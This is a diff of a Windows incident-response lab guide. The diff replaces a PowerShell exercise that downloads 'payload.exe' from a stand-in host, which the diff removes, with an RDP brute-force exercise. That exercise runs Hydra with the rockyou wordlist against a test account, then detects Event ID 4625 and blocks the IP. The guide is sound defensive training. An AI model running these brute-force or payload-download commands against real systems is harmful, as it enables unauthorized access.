@@ -73,83 +73,103 @@ The NIST Incident Response Lifecycle includes **4 main phases**:
 
 ---
 
-## **Lab Task: Simulating and Responding to Unauthorized Access**
-
-## **Lab Setup**
-
-### **Requirements:**
-- **System:** Windows 10/11 or Windows Server 2019/2022
-- **Tools:**
-  - **Windows Event Viewer**
-  - **PowerShell (Pre-installed)**
-  - **Task Manager / Process Explorer**
-  - **Sysinternals Tools (optional)**
+## 🧪 Lab Task: Detect and Respond: Windows Server RDP Brute Force Attack
 
 ---
 
-## **Preparation:**
+## 🧰 Lab Setup and Requirements
 
-Before diving into the lab, ensure the system is logging essential security-related events and the environment is prepared for simulating a basic security incident.
+### 🖥️ Machines Required:
+- **Windows Server 2019 or 2022**
+  - RDP enabled
+  - Event Viewer access
+  - One local user account with known username
+- **Kali Linux VM**
+  - Hydra pre-installed
+  - Connected to same LAN or Virtual Network
 
-### **Enable Audit Logging:**
-1. Open **Local Security Policy** (`secpol.msc`).
-2. Navigate to:  
-   `Advanced Audit Policy Configuration → Audit Policies → Logon/Logoff`.
-3. Enable:
-   - **Audit Logon Events** (Success, Failure)
-   - **Audit Process Creation**
-
-4. Use Group Policy or Registry to enable:
-   - **Script Block Logging** for PowerShell
-   - **Module Logging**
-
----
-
-
-### **Step 1: Simulate a Failed Login Attempt**
-1. On the Windows machine, **lock the system** (`Win + L`).
-2. Attempt to log in with an **invalid password** 2–3 times.
-
-### **Step 2: Detect the Incident Using Event Viewer**
-1. Open **Event Viewer**.
-2. Navigate to:  
-   `Windows Logs → Security`
-3. Click on **Filter Current Log**, filter by **Event ID 4625** (failed logon).
-4. Locate the log entry showing the failed login attempt.
-5. Note down:
-   - Account Name used
-   - Source IP (if any)
-   - Logon Type
+### 📶 Network:
+- Ensure **both machines are on the same network**
+- Verify **RDP (TCP/3389)** is open on Windows Server
 
 ---
 
-### **Step 3: Simulate a Suspicious PowerShell Command**
-Run this from an **elevated PowerShell** session:
+## ⚙️ Preparation Steps
 
-```powershell
-Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
+### On **Windows Server**:
+1. **Enable RDP**:  
+   `System Properties → Remote → Enable Remote Desktop`
+
+2. **Allow RDP in Firewall**:  
+   `Windows Defender Firewall → Advanced Settings → Inbound Rules → Remote Desktop (TCP-In) → Enable`
+
+3. **Create Test User**:
+   ```powershell
+   net user attackerlab Password123 /add
+   ```
+Open Event Viewer:
+Windows Logs → Security
+Filter for Event ID 4625 (Failed Logon)
+
+
+
+### 🎯 Simulate the Attack
+
+1. On Kali Linux:
+Install Hydra (if not installed):
+
 ```
-This mimics downloading a suspicious file.
+sudo apt update && sudo apt install hydra
+```
+Prepare Wordlist: Use the existing list or create a custom one, e.g.: /usr/share/wordlists/rockyou.txt
+2. Run this command on Kali Linux:
+```
+hydra -t 4 -V -f -l attackerlab -P /usr/share/wordlists/rockyou.txt rdp://<Windows_Server_IP>
+```
+Replace <Windows_Server_IP> with actual IP of Windows Server
 
-### Step 4: Detect the PowerShell Activity
-1. Open Event Viewer.
-2. Navigate to:
-`Applications and Services Logs → Microsoft → Windows → PowerShell → Operational`
-3. Filter by Event ID 4104.
-4. Identify the PowerShell command used.
+### 👁️ Visualize the Alert in Event Viewer
+1. On Windows Server:
+Open `Event Viewer → Windows Logs → Security`
 
-### Step 5: Basic Response Actions
-- Kill the suspicious process from Task Manager.
-- Delete the file payload.exe from %TEMP%.
-- Take note of timestamps, user account, and command line parameters.
+2. Look for Event ID 4625 with:
 
-## Conclusion:
-- You learned the basic steps of detecting and responding to two common incidents: failed logins and suspicious PowerShell activity.
-- Incident response involves quick detection, containment, and investigation using built-in tools like Event Viewer and PowerShell logs.
-- Even basic Windows environments can generate rich telemetry for incident detection.
+Logon Type: 10 (RemoteInteractive / RDP)
 
-## Submission:
-Submit two screenshots:
-- One showing Event ID 4625 for the failed login attempt.
-- One showing PowerShell Event ID 4104 for the download attempt.
+Failure Reason: "Unknown user name or bad password"
+
+Caller IP Address: IP of Kali machine
+
+
+
+###🚨 Incident Response Steps
+1. Identify Repeated Failed Logons:
+- Spot Event ID 4625 from same IP
+2. Correlate IP Address:
+- Confirm repeated failures from attacker’s IP
+3. Lock the User Account (Optional):
+```
+net user attackerlab /active:no
+```
+4. Block Attacker IP:
+
+```
+New-NetFirewallRule -DisplayName "Block Attacker" -Direction Inbound -RemoteAddress <Kali_IP> -Action Block
+```
+5. Collect Evidence:
+- Export relevant Event Logs
+6. Report Incident:
+- Create a brief report with findings and actions taken
+
+📩 Submission Requirements
+Submit the following:
+- Screenshot of Hydra attack in Kali Linux
+- Screenshot of Event Viewer showing multiple 4625 events
+- Firewall rule
+
+✅ Conclusion
+This lab demonstrated how to:
+- Simulate an RDP brute-force attack using Hydra
+- Detect suspicious logons via Windows Event Viewer
+- Respond with basic IR steps without using Sysmon
 
